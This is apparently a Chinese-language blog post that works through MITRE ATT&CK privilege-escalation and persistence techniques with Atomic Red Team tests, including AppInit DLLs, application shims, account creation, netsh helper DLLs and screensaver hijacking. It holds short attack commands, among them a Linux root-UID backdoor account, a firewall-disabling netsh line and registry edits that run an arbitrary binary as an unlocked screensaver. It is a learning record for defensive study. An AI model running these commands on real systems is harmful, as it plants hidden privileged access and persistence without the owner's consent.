---
layout: post
title: 跟着ATT&CK学安全之privilege-escalation
excerpt: "跟着ATT&CK学安全之privilege-escalation"
categories: [ATT&CK]
comments: true
---
### T1015 - Accessibility Features
windows包含了一些不可见的特性,当使用登陆后使用组合键可以触发他们.红队可以修改启动他们的方式,从而在没有登陆系统的情况下获取命令行.

两个常见的程序是`C:\Windows\System32\sethc.exe`和`C:\Windows\System32\sethc.exe`,连续使用shift五次和`Windows + U `打开设置

其他的快捷键如下
- On-Screen Keyboard: C:\Windows\System32\osk.exe
- Magnifier: C:\Windows\System32\Magnify.exe
- Narrator: C:\Windows\System32\Narrator.exe
- Display Switcher: C:\Windows\System32\DisplaySwitch.exe
- App Switcher: C:\Windows\System32\AtBroker.exe

这个复现没有通过
##### T1103 - AppInit DLLs
AppInit_Dlls键值位于注册表 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows`下面，相对于其他的注册表启动项来说，这个键值的特殊之处在于任何使用到User32.dll 的EXE、DLL、OCX等类型的PE文件都会读取这个地方，并且根据约定的规范将这个键值下指向的DLL文件进行加载，加载的方式是调用 LoadLibrary。红队可以使用它加载恶意的dll从而实现persistence和privilege escalation

**AppInit DLL方法在win8和之后的版本已经不能使用了(当secure boot开启的时候)**
###### 测试1 Install AppInit Shim
```
reg.exe import T1103.reg
```
win10上成功复现
### T1138 - Application Shimming
The Microsoft Windows Application Compatibility Infrastructure/Framework(应用兼容基础框架)是用来做操作系统代码向下兼容的,例如它允许开发者修改为windowsxp创建的应用程序以便它在win10上继续使用.shims在操作系统和应用之间充当一个缓冲的角色,当程序运行的时候,shims 缓存决定程序是否需要shim database (.sdb),如果需要,shim将使用Hooking技术(https://attack.mitre.org/techniques/T1179)重定向代码以便与操作系统的通信,shims的默认安装位置如下
- `%WINDIR%\AppPatch\sysmain.sdb`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb`
databases存储的位置如下
- `%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom`

为了保证shims安全,shims运行在用户模式下,并且你需要使用adminstrator权限来运行它.shims可以用来bypass UAC,向进程中注入dll.禁止 Data Execution Prevention和Structure Exception Handling和获取内存数据.向Hooking一样,利用shims可以让红队权限提升,安装后门,关闭windows防护功能等等.
###### 测试1 Application Shim Installation
```
sdbinst.exe D:\pycharmproject\atomic-red-team-master\atomics\T1138\src\AtomicShimx86.sdb
sdbinst.exe -u D:\pycharmproject\atomic-red-team-master\atomics\T1138\src\AtomicShimx86.sdb
```
有效果,但是不知道是干啥的
### T1136 - Create Account
红队可以创建一个账号来维持控制,windows上用`net user`来创建账号
###### 测试1 Create a user account on a Linux system
平台:linux
```
useradd -M -N -r -s /bin/bash -c evil_account eviluser
```
成功复现
###### 测试2 Create a new user in a command prompt
平台:windows
```
net user /add morty test123456
```
win10成功复现
###### 测试3 Create a new user in PowerShell
powershell中运行
```
New-LocalUser -Name morty -NoPassword
```
win10成功复现
###### 测试4 Create a new user in Linux with root UID and GID.
linux中运行
```
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
echo "#{password}" | passwd --stdin #{username}
```
成功复现
### T1042 - Change Default File Association
```bash
cmd.exe /c assoc .wav="C:\Program Files\Windows Media Player\wmplayer.exe"
或者
cmd.exe /c assoc .aa="C:\Program Files\Windows Media Player\wmplayer.exe"
```
看到成功修改了,但是不知道怎么用
### T1128 - Netsh Helper DLL
Netsh.exe(也叫做Netshell)就用来配置网络的命令行集合,它允许添加helper dlls用来新增函数,它的位置在`HKLM\SOFTWARE\Microsoft\Netsh`

红队可以使用它来加载一些恶意的dll,当系统运行了netsh的时候,恶意的dll就会运行

netsh常用命令如下
```
查看ip配置信息： netsh interface ip show config

查看网络配置文件： netsh -c interface dump

开/关网卡： netsh int set int name="ethernet" admin=enabled netsh int set int name="ethernet" admin=disabled

查看所有tcp连接： netsh interface ip show tcpconnections

设置本机ip、子网掩码、网关ip： netsh interface ip set address "Local Area Connection" static 192.168.1.2 255.255.255.0 192.168.1.1

查看防火墙状态： netsh firewall show state

开/关防火墙：

netsh firewall set opmode enable

netsh firewall set opmode disable
```
关于netsh persistence的项目地址`https://github.com/outflanknl/NetshHelperBeacon`
添加helper dll
```bash
netsh add helper c:\test\netshtest.dll
```
在注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh`中便添加上去了dll,helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll

检测: 查看注册表如下位置`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh`

win10成功复现
### T1100 - Web Shell
这个就是在有web服务的基础上添加一个webshell,不再演示

win10成功复现
### T1023 - Shortcut Modification
红队可以使用快捷方式运行他们的程序来persistence,他们可以使用[Masquerading](https://attack.mitre.org/techniques/T1036)来使它看起来像一个正常的程序,攻击者也可以修改快捷方式的路径,从而运行到其他程序
###### 测试1 Shortcut Modification
这个没有成功复现
### T1180 - Screensaver
`.scr`是屏幕保护程序的后缀名,屏幕保护程序`scrnsave.scr`的位置在`C:\Windows\System32\`和`C:\Windows\sysWOW64`,屏幕保护的注册表设置在`HKCU\Control Panel\Desktop`,他们可以以如下途径进行persistence

- SCRNSAVE.exe - set to malicious PE path
- ScreenSaveActive - set to '1' to enable the screensaver
- ScreenSaverIsSecure - set to '0' to not require a password to unlock
- ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed

红队可以使用屏幕保护程序persistence恶意程序(当用户一段时间没有对电脑操作,触发了屏幕保护程序)
###### 测试1 Set Arbitrary Binary as Screensaver
```
copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
shutdown /r /t 0
```
**没有成功复现**





### T1055 - Process Injection
